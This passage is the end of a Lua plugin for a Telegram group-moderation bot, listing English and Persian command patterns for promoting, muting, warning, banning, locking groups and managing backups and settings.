    _config.cmd .. "([Pp]romote)$",
    "^(\216\167\216\177\216\170\217\130\216\167)$",
    _config.cmd .. "([Pp]romote) (.*)$",
    "^(\216\167\216\177\216\170\217\130\216\167) (.*)$",
    _config.cmd .. "([Dd]emote)$",
    "^(\216\170\217\134\216\178\219\140\217\132)$",
    _config.cmd .. "([Dd]emote) (.*)$",
    "^(\216\170\217\134\216\178\219\140\217\132) (.*)$",
    _config.cmd .. "([Mm]odlist)$",
    "^(\217\132\219\140\216\179\216\170 \217\133\216\175\219\140\216\177\216\167\217\134)$",
    _config.cmd .. "([Oo]wnerlist)$",
    "^(\217\132\219\140\216\179\216\170 \216\181\216\167\216\173\216\168\216\167\217\134)$",
    _config.cmd .. "([Ll]ock) (.*)$",
    "^(\217\130\217\129\217\132) (.*)$",
    _config.cmd .. "([Uu]n[Ll]ock) (.*)$",
    "^(\216\168\216\167\216\178 \218\169\216\177\216\175\217\134) (.*)$",
    _config.cmd .. "([Ll]ink)$",
    "^(\217\132\219\140\217\134\218\169 \218\175\216\177\217\136\217\135)$",
    _config.cmd .. "([Ll]ink) (pv)$",
    "^(\217\132\219\140\217\134\218\169 \218\175\216\177\217\136\217\135) (\217\190\219\140\217\136\219\140)$",
    _config.cmd .. "([Ss]etlink)$",
    "^(\216\170\217\134\216\184\219\140\217\133 \217\132\219\140\217\134\218\169)$",
    _config.cmd .. "([Ss]etlink) (.*)$",
    "^(\216\170\217\134\216\184\219\140\217\133 \217\132\219\140\217\134\218\169) (.*)$",
    _config.cmd .. "([Nn]ewlink)$",
    "^(\217\132\219\140\217\134\218\169 \216\172\216\175\219\140\216\175)$",
    _config.cmd .. "([Nn]ewlink) (pv)$",
    "^(\217\132\219\140\217\134\218\169 \216\172\216\175\219\140\216\175) (\217\190\219\140\217\136\219\140)$",
    _config.cmd .. "([Rr]ules)$",
    "^(\217\130\217\136\216\167\217\134\219\140\217\134)$",
    _config.cmd .. "([Ss]ettings)$",
    "^(\216\170\217\134\216\184\219\140\217\133\216\167\216\170)$",
    _config.cmd .. "([Ss]etrules) (.*)$",
    "^(\216\170\217\134\216\184\219\140\217\133 \217\130\217\136\216\167\217\134\219\140\217\134) (.*)$",
    _config.cmd .. "([Ss]etrules)$",
    "^(\216\170\217\134\216\184\219\140\217\133 \217\130\217\136\216\167\217\134\219\140\217\134)$",
    _config.cmd .. "([Ss]etname) (.*)$",
    "^(\216\170\217\134\216\184\219\140\217\133 \217\134\216\167\217\133) (.*)$",
    _config.cmd .. "([Cc]lean) (.*)$",
    "^(\217\190\216\167\218\169\216\179\216\167\216\178\219\140) (.*)$",
    _config.cmd .. "([Ss]etflood) (%d+)$",
    "^(\216\170\217\134\216\184\219\140\217\133 \216\173\216\179\216\167\216\179\219\140\216\170 \217\190\219\140\216\167\217\133 \216\177\218\175\216\168\216\167\216\177\219\140) (%d+)$",
    _config.cmd .. "([Uu]nblock) (.*)$",
    "^(\216\162\216\178\216\167\216\175) (.*)$",
    "^(\216\162\217\134\216\168\217\134) (.*)$",
    _config.cmd .. "([Uu]nblock)$",
    "^(\216\162\216\178\216\167\216\175)$",
    "^(\216\162\217\134\216\168\217\134)$",
    _config.cmd .. "([Rr]es) (.*)$",
    "^(\216\167\216\183\217\132\216\167\216\185\216\167\216\170) (.*)$",
    _config.cmd .. "([Aa]ccess) (.*)$",
    "^(\216\175\216\179\216\170\216\177\216\179\219\140) (.*)$",
    _config.cmd .. "([Ss]etlang) (.*)$",
    "^(\216\170\216\186\219\140\219\140\216\177 \216\178\216\168\216\167\217\134) (.*)$",
    _config.cmd .. "([Ff]ilterlist)$",
    "^(\217\132\219\140\216\179\216\170 \217\129\219\140\217\132\216\170\216\177)$",
    _config.cmd .. "([Ss]etwelcome) (.*)$",
    "^(\216\170\217\134\216\184\219\140\217\133 \216\174\217\136\216\180 \216\162\217\133\216\175 \218\175\217\136\219\140\219\140) (.*)$",
    _config.cmd .. "([Ww]elcome) (.*)$",
    "^(\216\174\217\136\216\180 \216\162\217\133\216\175 \218\175\217\136\219\140\219\140) (.*)$",
    _config.cmd .. "([Mm]ute) (.*) (%d+)$",
    "^(\217\133\219\140\217\136\216\170) (.*) (%d+)$",
    _config.cmd .. "([Mm]ute) (.*)$",
    "^(\217\133\219\140\217\136\216\170) (.*)$",
    _config.cmd .. "([Uu]nmute) (.*) (%d+)$",
    "^(\216\162\217\134\217\133\219\140\217\136\216\170) (.*) (%d+)$",
    _config.cmd .. "([Uu]nmute) (.*)$",
    "^(\216\162\217\134\217\133\219\140\217\136\216\170) (.*)$",
    _config.cmd .. "([Mm]ymute)$",
    "^(\217\133\219\140\217\136\216\170 \217\133\217\134)$",
    _config.cmd .. "([Mm][Mm])$",
    _config.cmd .. "([Cc]mds)$",
    "^(\216\175\216\179\216\170\217\136\216\177\216\167\216\170)$",
    _config.cmd .. "([Hh]elp)$",
    "^(\216\177\216\167\217\135\217\134\217\133\216\167)$",
    _config.cmd .. "([Cc]mds) (.*)$",
    "^(\216\175\216\179\216\170\217\136\216\177\216\167\216\170) (.*)$",
    _config.cmd .. "([Hh]elp) (.*)$",
    "^(\216\177\216\167\217\135\217\134\217\133\216\167) (.*)$",
    _config.cmd .. "([Bb]ackup)$",
    "^(\216\168\218\169 \216\162\217\190)$",
    _config.cmd .. "([Gg]et[Bb]ackup)$",
    "^(\216\167\216\179\216\170\217\129\216\167\216\175\217\135 \216\167\216\178 \216\168\218\169 \216\162\217\190)$",
    _config.cmd .. "([Gg]et[Bb]ackup) (.*)$",
    "^(\216\167\216\179\216\170\217\129\216\167\216\175\217\135 \216\167\216\178 \216\168\218\169 \216\162\217\190) (.*)$",
    _config.cmd .. "([Pp]hoto[Ii]d) (.*)$",
    "^(\216\185\218\169\216\179 \216\162\219\140\216\175\219\140) (.*)$",
    _config.cmd .. "([Ss]et[Mm]ax[Ww]arn) (%d+)",
    "^(\216\170\217\134\216\184\219\140\217\133 \216\173\216\175\216\167\218\169\216\171\216\177 \216\167\216\174\216\183\216\167\216\177) (%d+)$",
    _config.cmd .. "([Ii]nvite[Kk]icked)$",
    "^(\216\175\216\185\217\136\216\170 \216\167\216\174\216\177\216\167\216\172 \216\180\216\175\217\135 \217\135\216\167)$",
    _config.cmd .. "([Ss]et[Ff]lood[Tt]ime) (%d+)$",
    "^(\216\170\217\134\216\184\219\140\217\133 \216\178\217\133\216\167\217\134 \217\190\219\140\216\167\217\133 \216\177\218\175\216\168\216\167\216\177\219\140) (%d+)$",
    _config.cmd .. "([Ss]et[Ff]orced[Ii]nvite) (%d+)$",
    "^(\216\170\217\134\216\184\219\140\217\133 \216\175\216\185\217\136\216\170 \216\167\216\172\216\168\216\167\216\177\219\140) (%d+)$",
    _config.cmd .. "([Aa]dd[Ss]ettings) (.*)$",
    "^(\216\167\216\182\216\167\217\129\217\135 \218\169\216\177\216\175\217\134 \216\170\217\134\216\184\219\140\217\133\216\167\216\170) (.*)$",
    _config.cmd .. "([Dd]el[Ss]ettings) (.*)$",
    "^(\216\173\216\176\217\129 \216\170\217\134\216\184\219\140\217\133\216\167\216\170) (.*)$",
    _config.cmd .. "([Mm]anager)$",
    "^(\217\133\216\175\219\140\216\177\219\140\216\170)$",
    _config.cmd .. "([Bb]lock)$",
    "^(\217\133\216\179\216\175\217\136\216\175)$",
    _config.cmd .. "([Bb]lock) (.*)$",
    "^(\217\133\216\179\216\175\217\136\216\175) (.*)$",
    "^(\216\168\217\134)$",
    "^(\216\168\217\134) (.*)$",
    _config.cmd .. "([Bb]lock[Ll]ist)$",
    "^(\217\132\219\140\216\179\216\170 \217\133\216\179\216\175\217\136\216\175)$",
    _config.cmd .. "([Vv]ideo) (.*)$",
    _config.cmd .. "([Cc]alc) (.*)$",
    "^(\217\133\216\167\216\180\219\140\217\134 \216\173\216\179\216\167\216\168) (.*)$",
    _config.cmd .. "([Tt]ovoice) (.*)$",
    "^(\216\168\217\135 \216\181\216\175\216\167) (.*)$",
    _config.cmd .. "([Tt]ime)$",
    "^(\216\178\217\133\216\167\217\134)$",
    _config.cmd .. "([Pp]oll) (.*)$",
    "^(\217\134\216\184\216\177\216\179\217\134\216\172\219\140) (.*)$",
    _config.cmd .. "([Bb]old) (.*)$",
    "^(\217\133\216\170\217\134 \218\169\217\132\217\129\216\170) (.*)$",
    _config.cmd .. "([Ii]talic) (.*)$",
    "^(\217\133\216\170\217\134 \218\169\216\172) (.*)$",
    _config.cmd .. "([Cc]ode) (.*)$",
    "^(\217\133\216\170\217\134 \218\169\216\175) (.*)$",
    _config.cmd .. "([Mm]axchat) (%d+)$",
    _config.cmd .. "([Ll]ock[Gg]roup) (%d+:%d+) (%d+:%d+)$",
    _config.cmd .. "([Ll]ock[Gg]roup) (%d+)(.*)$",
    _config.cmd .. "([Uu]nlock[Gg]roup)$",
    _config.cmd .. "([Ee]dit[Bb]ot) (%d+) (.*)$",
    _config.cmd .. "([Ee]dit[Bb]ot) (all) (help)$",
    _config.cmd .. "([Ss]ense) (.*)$",
    _config.cmd .. "([Ss]udo[Aa]ccess) (%d+) (.*)$",
    _config.cmd .. "([Ss]et[Ss]udo) (.*)$",
    _config.cmd .. "([Ss]et[Ss]udo)$",
    _config.cmd .. "([Cc]heckupdate)$",
    _config.cmd .. "([Ff]orceupdate)$",
    _config.cmd .. "([Ss]end[Pp]m) (.*)$",
    _config.cmd .. "([Ss]end[Pp]m[Tt]o) (%d+) (.*)$",
    _config.cmd .. "([Bb]anall)$",
    _config.cmd .. "([Bb]anall) (.*)$",
    _config.cmd .. "([Uu]nbanall)$",
    _config.cmd .. "([Uu]nbanall) (.*)$",
    _config.cmd .. "([Gg]banlist)$",
    _config.cmd .. "([Ss]et[Mm]ax[Ww]ords) (%d+)$",
    _config.cmd .. "([Ss]ilent)$",
    _config.cmd .. "([Ss]ilent) (.*)$",
    _config.cmd .. "([Uu]nsilent)$",
    _config.cmd .. "([Uu]nsilent) (.*)$",
    _config.cmd .. "([Ss]ilentlist)$",
    _config.cmd .. "([Dd]elall)$",
    _config.cmd .. "([Dd]elall) (.*)$",
    _config.cmd .. "([Ff]ilter) (.*)$",
    _config.cmd .. "([Aa]dd[Rr]eply) {(.*)} (.*)",
    _config.cmd .. "([Dd]el[Rr]eply) {(.*)} (.*)",
    _config.cmd .. "([Aa]ll[Rr]eply) {(.*)}",
    _config.cmd .. "([Rr]eply[Aa]ccess) {(.*)} (.*)",
    _config.cmd .. "([Aa]llow) (.*)$",
    _config.cmd .. "([Aa]llow)$",
    _config.cmd .. "([Aa]llow[Ll]ist)$",
    _config.cmd .. "([Rr]eload)$",
    _config.cmd .. "([Rr]eport)$",
    _config.cmd .. "([Rr]eportlist)$",
    _config.cmd .. "([Cc]lean [Rr]eportlist)$",
    _config.cmd .. "([Dd]elsudo)$",
    _config.cmd .. "([Ss]udolist)$",
    _config.cmd .. "([Dd]el[Pp])$",
    _config.cmd .. "([Dd]elsudo) (.*)$",
    _config.cmd .. "([Ll]eave)$",
    _config.cmd .. "([Cc]onfig)$",
    _config.cmd .. "([Aa]utoleave) (.*)$",
    _config.cmd .. "([Cc]reategroup) (.*)$",
    _config.cmd .. "([Cc]reatesuper) (.*)$",
    _config.cmd .. "([Tt]osuper)$",
    _config.cmd .. "([Cc]hats)$",
    _config.cmd .. "([Ss]et[Nn]erkh) (.*)$",
    _config.cmd .. "([Nn]erkh)$",
    _config.cmd .. "([Cc]lear cache)$",
    _config.cmd .. "([Jj]oin) (.*)$",
    _config.cmd .. "([Ii]mport) (.*)$",
    _config.cmd .. "([Cc]heck)$",
    _config.cmd .. "([Aa]mar)$",
    _config.cmd .. "([Ss]tats)$",
    _config.cmd .. "([Cc]heck) (.*)$",
    _config.cmd .. "([Cc]harge) (.*) (%d+)$",
    _config.cmd .. "([Cc]harge) (%d+)$",
    _config.cmd .. "([Rr]msg) (%d+)$",
    _config.cmd .. "([Dd]elmsg) (%d+)$",
    _config.cmd .. "(+)([Cc]harge) (%d+)$",
    _config.cmd .. "(-)([Cc]harge) (%d+)$",
    _config.cmd .. "([Hh]elpme) (.*)$",
    _config.cmd .. "(votemute) (%d+)$",
    _config.cmd .. "(delmute) (%d+)$",
    _config.cmd .. "([Ww]arn) (.*)$",
    _config.cmd .. "([Dd]elwarn) (%d+)$",
    _config.cmd .. "([Dd]elwarn)$",
    _config.cmd .. "([Cc]leanwarn) (%d+)$",
    _config.cmd .. "([Cc]leanwarn)$",
    _config.cmd .. "([Ww]arn[Ss]tatus) (.*)$",
    _config.cmd .. "([Ss]et[Rr]ank) (.*)$",
    "^(\216\170\217\134\216\184\219\140\217\133 \216\177\217\134\218\169) (.*)$",
    "^([https?://w]*.?telegram.me/joinchat/%S+)$",
    "^([https?://w]*.?t.me/joinchat/%S+)$",
    "^(\216\173\216\175\216\167\218\169\216\171\216\177 \218\134\216\170) (%d+)$",
    "^(\216\167\216\182\216\167\217\129\217\135 \218\169\216\177\216\175\217\134 \217\190\216\167\216\179\216\174) {(.*)} (.*)",
    "^(\216\173\216\176\217\129 \217\190\216\167\216\179\216\174) {(.*)} (.*)",
    "^(\217\135\217\133\217\135 \217\190\216\167\216\179\216\174 \217\135\216\167\219\140) {(.*)}",
    "^(\216\175\216\179\216\170\216\177\216\179\219\140 \217\190\216\167\216\179\216\174) {(.*)} (.*)",
    "^(\217\130\217\129\217\132 \218\175\216\177\217\136\217\135) (%d+:%d+) (%d+:%d+)$",
    "^(\217\130\217\129\217\132 \218\175\216\177\217\136\217\135) (%d+)(.*)$",
    "^(\216\168\216\167\216\178\218\169\216\177\216\175\217\134 \218\175\216\177\217\136\217\135)$",
    "^(\217\136\219\140\216\177\216\167\219\140\216\180 \216\177\216\168\216\167\216\170) (%d+) (.*)$",
    "^(\217\136\219\140\216\177\216\167\219\140\216\180 \216\177\216\168\216\167\216\170) (all) (help)$",
    "^(\217\135\217\136\216\180 \217\133\216\181\217\134\217\136\216\185\219\140) (.*)$",
    "^(\216\175\216\179\216\170\216\177\216\179\219\140 \216\179\217\136\216\175\217\136) (%d+) (.*)$",
    "^(\216\170\217\134\216\184\219\140\217\133 \216\179\217\136\216\175\217\136) (.*)$",
    "^(\216\170\217\134\216\184\219\140\217\133 \216\179\217\136\216\175\217\136)$",
    "^(\218\134\218\169 \216\162\217\190\216\175\219\140\216\170)$",
    "^(\216\167\216\177\216\179\216\167\217\132 \217\190\219\140\216\167\217\133) (.*)$",
    "^(\216\167\216\177\216\179\216\167\217\132 \217\190\219\140\216\167\217\133 \216\168\217\135) (%d+) (.*)$",
    "^(\218\175\217\132\217\136\216\168\216\167\217\132 \216\168\217\134)$",
    "^(\218\175\217\132\217\136\216\168\216\167\217\132 \216\168\217\134) (.*)$",
    "^(\218\175\217\132\217\136\216\168\216\167\217\132 \216\162\217\134\216\168\217\134)$",
    "^(\218\175\217\132\217\136\216\168\216\167\217\132 \216\162\217\134\216\168\217\134) (.*)$",
    "^(\217\132\219\140\216\179\216\170 \218\175\217\132\217\136\216\168\216\167\217\132 \216\168\217\134)$",
    "^(\216\170\217\134\216\184\219\140\217\133 \216\173\216\175\216\167\218\169\216\171\216\177 \218\169\217\132\217\133\216\167\216\170) (%d+)$",
    "^(\216\179\218\169\217\136\216\170)$",
    "^(\216\179\218\169\217\136\216\170) (.*)$",
    "^(\216\168\216\177\216\175\216\167\216\180\216\170\217\134 \216\179\218\169\217\136\216\170)$",
    "^(\216\168\216\177\216\175\216\167\216\180\216\170\217\134 \216\179\218\169\217\136\216\170) (.*)$",
    "^(\217\132\219\140\216\179\216\170 \216\179\218\169\217\136\216\170)$",
    "^(\216\173\216\176\217\129 \217\135\217\133\217\135 \217\190\219\140\216\167\217\133 \217\135\216\167)$",
    "^(\216\173\216\176\217\129 \217\135\217\133\217\135 \217\190\219\140\216\167\217\133 \217\135\216\167) (.*)$",
    "^(\217\129\219\140\217\132\216\170\216\177) (.*)$",
    "^(\217\133\216\172\216\167\216\178) (.*)$",
    "^(\217\133\216\172\216\167\216\178)$",
    "^(\217\132\219\140\216\179\216\170 \217\133\216\172\216\167\216\178)$",
    "^(\216\177\219\140\217\132\217\136\216\175)$",
    "^(\218\175\216\178\216\167\216\177\216\180)$",
    "^(\217\132\219\140\216\179\216\170 \218\175\216\178\216\167\216\177\216\180)$",
    "^(\217\190\216\167\218\169\216\179\216\167\216\178\219\140 \217\132\219\140\216\179\216\170 \218\175\216\178\216\167\216\177\216\180)$",
    "^(\216\173\216\176\217\129 \216\179\217\136\216\175\217\136)$",
    "^(\217\132\219\140\216\179\216\170 \216\179\217\136\216\175\217\136)$",
    "^(\216\173\216\176\217\129 \216\179\217\136\216\175\217\136) (.*)$",
    "^(\216\170\216\177\218\169 \218\175\216\177\217\136\217\135)$",
    "^(\218\169\216\167\217\134\217\129\219\140\218\175)$",
    "^(\216\170\216\177\218\169 \216\174\217\136\216\175\218\169\216\167\216\177) (.*)$",
    "^(\216\179\216\167\216\174\216\170 \218\175\216\177\217\136\217\135) (.*)$",
    "^(\216\179\216\167\216\174\216\170 \216\167\216\168\216\177\218\175\216\177\217\136\217\135) (.*)$",
    "^(\216\170\216\168\216\175\219\140\217\132 \216\168\217\135 \216\167\216\168\216\177\218\175\216\177\217\136\217\135)$",
    "^(\218\134\216\170 \217\135\216\167)$",
    "^(\216\170\217\134\216\184\219\140\217\133 \217\134\216\177\216\174) (.*)$",
    "^(\217\134\216\177\216\174)$",
    "^(\216\172\217\136\219\140\217\134) (.*)$",
    "^(\216\167\219\140\217\133\217\190\217\136\216\177\216\170) (.*)$",
    "^(\216\168\216\177\216\177\216\179\219\140)$",
    "^(\216\162\217\133\216\167\216\177)$",
    "^(\216\168\216\177\216\177\216\179\219\140) (.*)$",
    "^(\216\180\216\167\216\177\218\152) (.*) (%d+)$",
    "^(\216\180\216\167\216\177\218\152) (%d+)$",
    "^(\216\173\216\176\217\129 \217\190\219\140\216\167\217\133) (%d+)$",
    "^(+)(\216\180\216\167\216\177\218\152) (%d+)$",
    "^(-)(\216\180\216\167\216\177\218\152) (%d+)$",
    "^(\216\177\216\167\217\135\217\134\217\133\216\167\219\140\219\140) (.*)$",
    "^(\216\177\216\167\219\140 \217\133\219\140\217\136\216\170) (%d+)$",
    "^(\216\173\216\176\217\129 \217\133\219\140\217\136\216\170) (%d+)$",
    "^(\216\167\216\174\216\183\216\167\216\177) (.*)$",
    "^(\216\173\216\176\217\129 \216\167\216\174\216\183\216\167\216\177) (%d+)$",
    "^(\216\173\216\176\217\129 \216\167\216\174\216\183\216\167\216\177)$",
    "^(\217\136\216\182\216\185\219\140\216\170 \216\167\216\174\216\183\216\167\216\177) (.*)$"
  },
  run = run,
  helper = helper,
  pre_process = pre_process
}
